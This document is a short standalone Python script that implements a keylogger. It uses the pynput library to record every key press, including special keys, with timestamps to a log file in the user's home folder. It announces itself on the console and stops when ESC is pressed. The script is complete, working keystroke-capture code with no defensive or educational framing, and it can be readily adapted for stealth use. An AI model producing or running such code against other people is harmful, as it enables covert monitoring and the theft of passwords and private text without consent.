import os
import logging
import datetime
from pynput import keyboard

# Create a directory for logs (inside the user's home folder)
LOG_DIR = os.path.join(os.path.expanduser("~"), "keylogs")
os.makedirs(LOG_DIR, exist_ok=True)

# Generate a timestamped log file
LOG_FILE = os.path.join(LOG_DIR, f"keylog_{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt")

# Configure logging
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.DEBUG,
    format="%(asctime)s - %(message)s",
)

def on_press(key):
    """
    Callback function triggered when a key is pressed.
    Logs the key to a file.
    """
    try:
        logging.info(f"Key pressed: {key.char}")  # Log alphanumeric keys
    except AttributeError:
        logging.info(f"Special key pressed: {key}")  # Log special keys (e.g., Shift, Enter)

def on_release(key):
    """
    Callback function triggered when a key is released.
    Stops the keylogger when 'ESC' is pressed.
    """
    if key == keyboard.Key.esc:
        print("[*] Exiting keylogger...")
        return False  # Stops the listener

def start_keylogger():
    """
    Starts listening for keystrokes.
    """
    print(f"[*] Keylogger started. Logging keystrokes to: {LOG_FILE}")
    print("[*] Press 'ESC' to stop.")

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()  # Keep the keylogger running

if __name__ == "__main__":
    start_keylogger()
